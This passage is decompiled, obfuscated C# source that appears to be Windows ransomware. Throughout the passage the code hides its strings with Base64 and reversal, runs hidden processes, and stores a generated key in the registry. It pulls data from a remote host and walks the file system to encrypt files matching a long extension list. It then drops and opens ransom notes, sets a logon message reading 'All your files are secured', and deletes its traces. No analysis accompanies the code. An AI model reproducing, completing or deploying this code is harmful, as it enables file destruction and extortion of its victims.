						CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
						{
							cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
						};
					}
					Parallel.ForEach(yCIKPmfZtuIbUFAlB4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
				}
				List<string> ooMyfWWolleKv = OoMyfWWolleKv;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate18 = delegate(string string_0)
					{
						cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(getString_0(107386965)), string_0);
					};
				}
				Parallel.ForEach(ooMyfWWolleKv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate18);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			if (!RREAXVcGCyFW.Contains(currentDirectory))
			{
				RREAXVcGCyFW.Add(currentDirectory);
			}
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396269))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396269)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396220)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !RREAXVcGCyFW.Contains(text6) && text6 != getString_0(107396711) && text6 != getString_0(107396722) && text6 != getString_0(107396669))
								{
									RREAXVcGCyFW.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396640)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && text6 != getString_0(107396711) && text6 != getString_0(107396722) && text6 != getString_0(107396669))
								{
									CUzJiAbMAitn.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396651)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396606))
						{
							rgPcaXsDNBQ = getString_0(107396821);
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396629))
						{
							rgPcaXsDNBQ = getString_0(107396620);
						}
					}
					if (text3.Contains(getString_0(107396583)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396606))
						{
							oGWxQvtPLxTata = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396629))
						{
							oGWxQvtPLxTata = true;
						}
					}
					if (text3.Contains(getString_0(107396598)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396606))
						{
							iJiZVjbYIelgdjs = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396629))
						{
							iJiZVjbYIelgdjs = false;
						}
					}
					if (text3.Contains(getString_0(107396553)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396606))
						{
							yKfQtEFbRGh = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == getString_0(107396629))
						{
							yKfQtEFbRGh = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (iJiZVjbYIelgdjs)
			{
				try
				{
					File.AppendAllText(CJWDXdtMlfSYp, getString_0(107396556) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (rgPcaXsDNBQ == getString_0(107396620))
		{
			iWmwgazXcZIOXV();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && AmXJmjSSpzM)
			{
				try
				{
					Thread thread4 = new Thread(nCJyjTPBMPduz.yZywvQXlMUbbxf);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			cjBpjYTVdPckNjuX(getString_0(107396479), jPRGqhYdKzNWs(getString_0(107396498)));
		}
		SecureString secureString = new SecureString();
		if (xNacrcDdcyMpcHAi == getString_0(107396620))
		{
			if (!WcDXYQEnYXB)
			{
				NsSmeXJHTmoYqwKN = ynyhEGlCIJnfcaD.QwIgDgKzjcsoDE(32);
				ndmvemzTqn = ynyhEGlCIJnfcaD.WTEHzpQRSAZmw();
			}
		}
		else
		{
			NsSmeXJHTmoYqwKN = getString_0(107395881);
		}
		if (!WcDXYQEnYXB)
		{
			lYLvwKXVot = VObDkPNSIzESE.NjZzWfIsqa(NsSmeXJHTmoYqwKN + ndmvemzTqn);
		}
		else
		{
			try
			{
				PLwArgCGtmsJ();
				NsSmeXJHTmoYqwKN = pJTXJoaZiy(TSLNmyZpJvFY(odSXvXhnBEMCo, EjwjUVUQBQfB(bfYXiuTlOhZZ)));
				odSXvXhnBEMCo = null;
				ndmvemzTqn = pJTXJoaZiy(new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
				lYLvwKXVot = pJTXJoaZiy(vkIdOMxYDQuiM);
			}
			catch (Exception)
			{
				WcDXYQEnYXB = false;
				NsSmeXJHTmoYqwKN = ynyhEGlCIJnfcaD.QwIgDgKzjcsoDE(32);
				ndmvemzTqn = ynyhEGlCIJnfcaD.WTEHzpQRSAZmw();
				lYLvwKXVot = VObDkPNSIzESE.NjZzWfIsqa(NsSmeXJHTmoYqwKN + ndmvemzTqn);
			}
		}
		try
		{
			if (!ldSVapxVzrqD)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(jPRGqhYdKzNWs(getString_0(107395836)));
				if (registryKey != null)
				{
					registryKey.SetValue(jPRGqhYdKzNWs(getString_0(107395823)) + (registryKey.ValueCount + 1), lYLvwKXVot);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(jPRGqhYdKzNWs(getString_0(107395836)));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(jPRGqhYdKzNWs(getString_0(107395823)) + (registryKey.ValueCount + 1), lYLvwKXVot);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			SnRSscbMrPPgbx = true;
		}
		if (JJEqXdEhsZwI == getString_0(107396821))
		{
			YSpeqxPvcWIk();
		}
		if (BbIbxCUpjhdp)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), VLIXjNPLrckApD)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), VLIXjNPLrckApD), string.Concat(jPRGqhYdKzNWs(getString_0(107395782)), new WebClient().DownloadString(jPRGqhYdKzNWs(getString_0(107395789))), getString_0(107395716), jPRGqhYdKzNWs(getString_0(107395711)), DateTime.Now, getString_0(107395716), jPRGqhYdKzNWs(getString_0(107396214)), lYLvwKXVot));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), VLIXjNPLrckApD), getString_0(107396125) + lYLvwKXVot);
				}
			}
			catch (Exception ex11)
			{
				if (iJiZVjbYIelgdjs)
				{
					try
					{
						File.AppendAllText(CJWDXdtMlfSYp, getString_0(107396096) + ex11.Message + getString_0(107395716));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!QgtapIBydwyYG || SnRSscbMrPPgbx)
		{
			kEOHrqcKUMkw(lYLvwKXVot);
		}
		try
		{
			try
			{
				if (oGWxQvtPLxTata)
				{
					Console.WriteLine(getString_0(107396079));
				}
			}
			catch
			{
			}
			lKIMFujwcgc(new string[1] { getString_0(107395998) }, new string[100]
			{
				getString_0(107396021),
				getString_0(107396016),
				getString_0(107396011),
				getString_0(107395970),
				getString_0(107395965),
				getString_0(107395992),
				getString_0(107395987),
				getString_0(107395982),
				getString_0(107395433),
				getString_0(107395428),
				getString_0(107395423),
				getString_0(107395450),
				getString_0(107395441),
				getString_0(107395436),
				getString_0(107395395),
				getString_0(107395390),
				getString_0(107395417),
				getString_0(107395412),
				getString_0(107395407),
				getString_0(107395370),
				getString_0(107395361),
				getString_0(107395356),
				getString_0(107395383),
				getString_0(107395378),
				getString_0(107395373),
				getString_0(107395336),
				getString_0(107395331),
				getString_0(107395326),
				getString_0(107395353),
				getString_0(107395348),
				getString_0(107395343),
				getString_0(107395306),
				getString_0(107395301),
				getString_0(107395296),
				getString_0(107395319),
				getString_0(107395314),
				getString_0(107395309),
				getString_0(107395272),
				getString_0(107395987),
				getString_0(107395267),
				getString_0(107395433),
				getString_0(107395290),
				getString_0(107395285),
				getString_0(107395280),
				getString_0(107395275),
				getString_0(107395238),
				getString_0(107395233),
				getString_0(107395228),
				getString_0(107395255),
				getString_0(107395250),
				getString_0(107395245),
				getString_0(107395208),
				getString_0(107395203),
				getString_0(107395198),
				getString_0(107395225),
				getString_0(107395220),
				getString_0(107395215),
				getString_0(107395690),
				getString_0(107395681),
				getString_0(107395676),
				getString_0(107395699),
				getString_0(107395654),
				getString_0(107395267),
				getString_0(107395673),
				getString_0(107395664),
				getString_0(107395623),
				getString_0(107395614),
				getString_0(107395637),
				getString_0(107395628),
				getString_0(107395591),
				getString_0(107395582),
				getString_0(107395605),
				getString_0(107395596),
				getString_0(107395559),
				getString_0(107395554),
				getString_0(107395549),
				getString_0(107395576),
				getString_0(107395571),
				getString_0(107395566),
				getString_0(107395525),
				getString_0(107395520),
				getString_0(107395515),
				getString_0(107395542),
				getString_0(107395537),
				getString_0(107395532),
				getString_0(107395491),
				getString_0(107395514),
				getString_0(107395509),
				getString_0(107395301),
				getString_0(107395504),
				getString_0(107395499),
				getString_0(107395462),
				getString_0(107395457),
				getString_0(107395452),
				getString_0(107395475),
				getString_0(107395470),
				getString_0(107394921),
				getString_0(107394912),
				getString_0(107394907),
				getString_0(107394934)
			}, new string[0], NsSmeXJHTmoYqwKN, getString_0(107394929));
		}
		catch (Exception ex6)
		{
			if (iJiZVjbYIelgdjs)
			{
				try
				{
					File.AppendAllText(CJWDXdtMlfSYp, getString_0(107394884) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!QgtapIBydwyYG || SnRSscbMrPPgbx)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891));
					streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107394826)).Replace(getString_0(107389624), tHlEcNRvGaVVN.IYTCsYJsmzxE()).Replace(getString_0(107389615), Environment.UserName).Replace(getString_0(107389566), Environment.MachineName)
						.Replace(getString_0(107390057), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395716));
					if (zcUPsmvQPTXgnTL || !ldSVapxVzrqD)
					{
						streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107390072)));
						streamWriter.WriteLine(lYLvwKXVot);
					}
					if (xkNXdReJgqdr == getString_0(107396620))
					{
						streamWriter.WriteLine(getString_0(107395716));
						streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107390023)) + Convert.ToString(rIFldVBsKLex.Count));
					}
					if (mVHEjGEVbs)
					{
						streamWriter.WriteLine(getString_0(107395716));
						streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107389978)));
						streamWriter.WriteLine(tHlEcNRvGaVVN.IYTCsYJsmzxE());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891));
					if (!text7.Contains(lYLvwKXVot) && !ldSVapxVzrqD)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891), getString_0(107389945) + lYLvwKXVot);
					}
				}
			}
			catch (Exception ex6)
			{
				if (iJiZVjbYIelgdjs)
				{
					try
					{
						File.AppendAllText(CJWDXdtMlfSYp, getString_0(107389884) + ex6.Message + getString_0(107395716));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string tCYvoiODTAq in tCYvoiODTAqS)
			{
				num++;
				try
				{
					if (tCYvoiODTAq == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(tCYvoiODTAq + getString_0(107394891)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891), tCYvoiODTAq + getString_0(107394891), overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891));
						if (!text7.Contains(lYLvwKXVot) && !ldSVapxVzrqD)
						{
							File.AppendAllText(tCYvoiODTAq + getString_0(107394891), getString_0(107389945) + lYLvwKXVot);
						}
					}
				}
				catch (Exception ex6)
				{
					if (iJiZVjbYIelgdjs)
					{
						try
						{
							File.AppendAllText(CJWDXdtMlfSYp, getString_0(107389884) + ex6.Message + getString_0(107395716));
						}
						catch (Exception)
						{
						}
					}
					num--;
				}
				if (!UJmSBWsTWhUWfFO && num > 10)
				{
					break;
				}
			}
		}
		if ((ezwxvYAfqF == getString_0(107396821) && !QgtapIBydwyYG) || (ezwxvYAfqF == getString_0(107396821) && SnRSscbMrPPgbx))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389871)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389871));
					streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107389838)).Replace(getString_0(107389624), tHlEcNRvGaVVN.IYTCsYJsmzxE()).Replace(getString_0(107389615), Environment.UserName).Replace(getString_0(107389566), Environment.MachineName)
						.Replace(getString_0(107390057), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395716));
					if (zcUPsmvQPTXgnTL || !ldSVapxVzrqD)
					{
						streamWriter.WriteLine(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107389277))));
						streamWriter.WriteLine(lYLvwKXVot + jPRGqhYdKzNWs(getString_0(107389236)));
					}
					if (xkNXdReJgqdr == getString_0(107396620))
					{
						streamWriter.WriteLine(getString_0(107395716));
						streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107389191)) + jPRGqhYdKzNWs(getString_0(107390023)) + Convert.ToString(rIFldVBsKLex.Count) + jPRGqhYdKzNWs(getString_0(107389236)));
					}
					if (mVHEjGEVbs)
					{
						streamWriter.WriteLine(getString_0(107395716));
						streamWriter.WriteLine(jPRGqhYdKzNWs(getString_0(107389978)));
						streamWriter.WriteLine(tHlEcNRvGaVVN.IYTCsYJsmzxE());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891));
					if (!text7.Contains(lYLvwKXVot) && !ldSVapxVzrqD)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389871), jPRGqhYdKzNWs(getString_0(107389191)) + getString_0(107389945) + lYLvwKXVot + jPRGqhYdKzNWs(getString_0(107389236)));
					}
				}
			}
			catch (Exception ex6)
			{
				if (iJiZVjbYIelgdjs)
				{
					try
					{
						File.AppendAllText(CJWDXdtMlfSYp, getString_0(107389130) + ex6.Message + getString_0(107395716));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (NgFxRivWtQo == getString_0(107396821))
		{
			try
			{
				if (xkNXdReJgqdr == getString_0(107396620))
				{
					tHlEcNRvGaVVN.CjpZJXQFOpmLruF(getString_0(107389105), getString_0(107389100), getString_0(107389055), string.Concat(jPRGqhYdKzNWs(getString_0(107395782)), new WebClient().DownloadString(jPRGqhYdKzNWs(getString_0(107395789))), getString_0(107389078), jPRGqhYdKzNWs(getString_0(107395711)), DateTime.Now, getString_0(107395716), jPRGqhYdKzNWs(getString_0(107389073)), Convert.ToString(rIFldVBsKLex.Count), getString_0(107395716), jPRGqhYdKzNWs(getString_0(107396214)), lYLvwKXVot));
				}
				else
				{
					tHlEcNRvGaVVN.CjpZJXQFOpmLruF(getString_0(107389105), getString_0(107389100), getString_0(107389055), string.Concat(jPRGqhYdKzNWs(getString_0(107395782)), new WebClient().DownloadString(jPRGqhYdKzNWs(getString_0(107395789))), getString_0(107389078), jPRGqhYdKzNWs(getString_0(107395711)), DateTime.Now, getString_0(107395716), jPRGqhYdKzNWs(getString_0(107389073)), Convert.ToString(rIFldVBsKLex.Count), getString_0(107395716), jPRGqhYdKzNWs(getString_0(107396214)), lYLvwKXVot));
				}
			}
			catch
			{
			}
		}
		if (qqiiQuXknD == getString_0(107396821))
		{
			try
			{
				eNOZsuRDtvDVyd.JrQaTHxbOuAqF(new Uri(getString_0(107389504)));
			}
			catch
			{
			}
		}
		if (ezwxvYAfqF == getString_0(107396620) && !QgtapIBydwyYG)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891)))
				{
					Process.Start(jPRGqhYdKzNWs(getString_0(107389503)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394891));
				}
				try
				{
					if (oGWxQvtPLxTata)
					{
						Console.WriteLine(getString_0(107389478));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (iJiZVjbYIelgdjs)
				{
					try
					{
						File.AppendAllText(CJWDXdtMlfSYp, getString_0(107389449) + ex6.Message + getString_0(107395716));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		else if (ezwxvYAfqF == getString_0(107396821) && !QgtapIBydwyYG)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389871)))
				{
					Process.Start(jPRGqhYdKzNWs(getString_0(107389428)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389871));
				}
				try
				{
					if (oGWxQvtPLxTata)
					{
						Console.WriteLine(getString_0(107389379));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (iJiZVjbYIelgdjs)
				{
					try
					{
						File.AppendAllText(CJWDXdtMlfSYp, getString_0(107389350) + ex6.Message + getString_0(107395716));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (JJEqXdEhsZwI == getString_0(107396821))
		{
			if (xYpLCAVgyBOj == getString_0(107396821) && !string.IsNullOrEmpty(UlVSLsCncbMdhGO) && !string.IsNullOrEmpty(uvZdOBpqtfGE))
			{
				GgXCxjftqowaPI(UlVSLsCncbMdhGO, uvZdOBpqtfGE);
			}
			else
			{
				GgXCxjftqowaPI(getString_0(107389329), getString_0(107388788));
			}
		}
		if (WRIJIYrfMdFFYO != getString_0(107388610))
		{
			lcBfXvrKPqbkd(WRIJIYrfMdFFYO);
		}
		if (!string.IsNullOrEmpty(WocDbkOwDbogol))
		{
			try
			{
				File.Delete(WocDbkOwDbogol);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396269))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396269)));
			}
		}
		catch (Exception ex11)
		{
			try
			{
				File.AppendAllText(CJWDXdtMlfSYp, getString_0(107388625) + ex11.Message);
			}
			catch (Exception)
			{
			}
		}
		if (iJiZVjbYIelgdjs)
		{
			try
			{
				File.AppendAllText(CJWDXdtMlfSYp, getString_0(107388548));
			}
			catch (Exception)
			{
			}
		}
		stopwatch.Stop();
		TimeSpan elapsed = stopwatch.Elapsed;
		string contents = string.Format(getString_0(107388567), elapsed.Hours, elapsed.Minutes, elapsed.Seconds, elapsed.Milliseconds / 10);
		if (iJiZVjbYIelgdjs)
		{
			try
			{
				File.AppendAllText(CJWDXdtMlfSYp, contents);
			}
			catch (Exception)
			{
			}
		}
		if (!hhcgraCrPsmCioL().Contains(getString_0(107389018)))
		{
			try
			{
				DjPMEMdbQtZKb(IaFrllmnGTUgy);
			}
			catch (Exception)
			{
			}
			List<string> yCIKPmfZtuIbUFAlB = YCIKPmfZtuIbUFAlB;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
				{
					cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
				};
			}
			Parallel.ForEach(yCIKPmfZtuIbUFAlB, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		}
		else
		{
			List<string> yCIKPmfZtuIbUFAlB2 = YCIKPmfZtuIbUFAlB;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					cjBpjYTVdPckNjuX(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107386498))), string_0);
				};
			}
			Parallel.ForEach(yCIKPmfZtuIbUFAlB2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (oWHQHJfsyNioFvF == getString_0(107389013))
		{
			MXWEDjfPHhhXM();
		}
	}

	public static void qRYbfbCMiykYGG()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(jPRGqhYdKzNWs(xTaQFUIySYvoZ(getString_0(107389004))), jPRGqhYdKzNWs(getString_0(107389329)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int poeEcMgeJQALjSao(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> zLmccystKPjm(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((CUzJiAbMAitn.Count > 0 && CUzJiAbMAitn.Contains(text)) || ((text.Contains(getString_0(107388850)) || text.Contains(getString_0(107388825)) || text.Contains(getString_0(107388280)) || text.ToLower().Contains(getString_0(107388231)) || text.ToLower().Contains(getString_0(107388250)) || text.Contains(getString_0(107388193)) || text.Contains(getString_0(107388204)) || text.ToLower().Contains(getString_0(107388159)) || text.ToLower().Contains(getString_0(107388178)) || text.ToLower().Contains(getString_0(107388141)) || text.ToLower().Contains(getString_0(107388100)) || text.ToLower().Contains(getString_0(107388115)) || text.ToLower().Contains(getString_0(107388070)) || text.ToLower().Contains(getString_0(107388089)) || text.ToLower().Contains(getString_0(107388036))) && !text.Contains(jPRGqhYdKzNWs(getString_0(107388043)))))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_0235;
			}
			catch
			{
			}
			continue;
			IL_0235:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388482)) && !fileInfo.FullName.Contains(getString_0(107388497)) && !fileInfo.FullName.Contains(getString_0(107388448)) && !fileInfo.FullName.Contains(getString_0(107388463)) && !fileInfo.FullName.Contains(getString_0(107388414)) && !fileInfo.FullName.Contains(getString_0(107388429)) && !fileInfo.FullName.Contains(getString_0(107388380)) && !fileInfo.FullName.Contains(getString_0(107388395)) && !fileInfo.FullName.Contains(getString_0(107388350)) && !fileInfo.FullName.Contains(getString_0(107388329)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388316)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388335)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388286)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388301)) && !fileInfo.FullName.Contains(jPRGqhYdKzNWs(getString_0(107387740))) && !fileInfo.FullName.Contains(getString_0(107387715)) && !fileInfo.FullName.Contains(getString_0(107387734)) && !fileInfo.FullName.Contains(getString_0(107396269)) && !fileInfo.FullName.Contains(getString_0(107387689)) && !fileInfo.FullName.EndsWith(getString_0(107394929)) && !fileInfo.FullName.EndsWith(getString_0(107387696)) && !fileInfo.FullName.EndsWith(getString_0(107387691)) && !fileInfo.FullName.EndsWith(getString_0(107387654)) && !fileInfo.FullName.EndsWith(getString_0(107387649)) && !fileInfo.FullName.Contains(getString_0(107387644)) && !fileInfo.FullName.Contains(yVwPEJFmibAZK) && !fileInfo.FullName.Contains(CJWDXdtMlfSYp) && !fileInfo.FullName.Contains(VLIXjNPLrckApD))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(hlKQtNLDuwX) * 1024.0 * 1024.0 && nLzLTpABeRNVVq == getString_0(107396821))
						{
							list.Add(fileInfo.FullName);
							wmICIWLtusd(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && nLzLTpABeRNVVq == getString_0(107396620))
						{
							list.Add(fileInfo.FullName);
							wmICIWLtusd(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void iWmwgazXcZIOXV()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387659));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!RREAXVcGCyFW.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387606), getString_0(107397191)).Replace(getString_0(107387601), getString_0(107387606))
					.Replace(getString_0(107387560), getString_0(107389504))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					RREAXVcGCyFW.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387606), getString_0(107397191)).Replace(getString_0(107387601), getString_0(107387606))
						.Replace(getString_0(107387560), getString_0(107389504))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387555), getString_0(107389504)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string cjBpjYTVdPckNjuX(string CDRdMpJemtbX = "", string EaBpZVwtevI = "")
	{
		string result = getString_0(107389504);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = CDRdMpJemtbX,
				Arguments = EaBpZVwtevI,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void gUHzNnhzYpz(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107387578),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string xTaQFUIySYvoZ(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string jPRGqhYdKzNWs(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void CqOQtQEeESwT(string HHePAQbRShVzLc = "", string QjfFJDLGisgV = "SW5mb3JtYXRpb24uLi4=", string yoTLWcBbMwO = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		HHePAQbRShVzLc = xTaQFUIySYvoZ(getString_0(107387529));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jPRGqhYdKzNWs(HHePAQbRShVzLc), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(jPRGqhYdKzNWs(getString_0(107387944)), jPRGqhYdKzNWs(QjfFJDLGisgV));
				registryKey.SetValue(jPRGqhYdKzNWs(getString_0(107387911)), jPRGqhYdKzNWs(yoTLWcBbMwO));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			HHePAQbRShVzLc = xTaQFUIySYvoZ(getString_0(107387882));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jPRGqhYdKzNWs(HHePAQbRShVzLc), writable: true);
